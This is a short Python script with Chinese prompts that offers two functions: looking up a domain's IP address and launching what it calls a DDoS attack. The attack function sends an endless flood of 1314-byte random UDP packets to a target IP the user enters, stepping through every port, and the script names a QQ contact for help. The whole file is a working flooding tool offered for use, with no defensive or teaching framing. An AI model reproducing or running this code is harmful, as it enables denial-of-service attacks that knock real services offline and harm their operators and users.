import sys
import os
import time
import socket
import random

sock = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
bytes = random._urandom(1314)

def ddos_attack():
    ip = input('目标IP:')
    port = input('端口(输入80):')
    port = int(port)
    print('请等5秒钟'
          "\n准备开始DDos攻击")
    n = 5
    while n > 0:
        time.sleep(1)
        print(str(n) + 's'
              '\n')
        #print('\n')
        n = n - 1

    sent = 0
    while True:
        try:
            sock.sendto(bytes,(ip,port))
            sent = sent + 1
            port = port + 1
            print("Sent " + str(sent) +" packet to " + ip + " throught port:" + str(port))
            if port == 65534:
                port = 1
        except:
            print('DDos时报错...'
                  '\n自行检查错误或请联系q1677276331')
            break

def get_ip(url):
    try:
        res = socket.getaddrinfo(url, None)
        #print(res)

        ip = res[0][4][0]
        print('该域名的ip为：' + ip)
    except:
        print('获取ip时报错...'
              '\n自行检查错误或请联系q1677276331')

print('查询域名IP与DDos攻击脚本'
      '\n\n遇到问题咨询q1677276331'
      '\n\n---------------------------------------------------------------------------------------------------------------------\n'
      '\n本程序有两个功能，查询域名ip与ddos攻击'
      '\n注：ddos攻击之前必须得知道域名的ip')

while True:
    r = input('\n查询域名ip输入ip;ddos攻击输入ddos;要退出输入quit:')
    if r == 'ip':
        get_url = input('输入目标域名:')
        get_ip(url=get_url)

    elif r == 'ddos':
        print('\nddos过程中若要停止按 ctrl + c\n')
        ddos_attack()

    elif r == 'quit':
        break

    else:
        print('请正确输入...')
        break

print('按任意键退出...')
input()









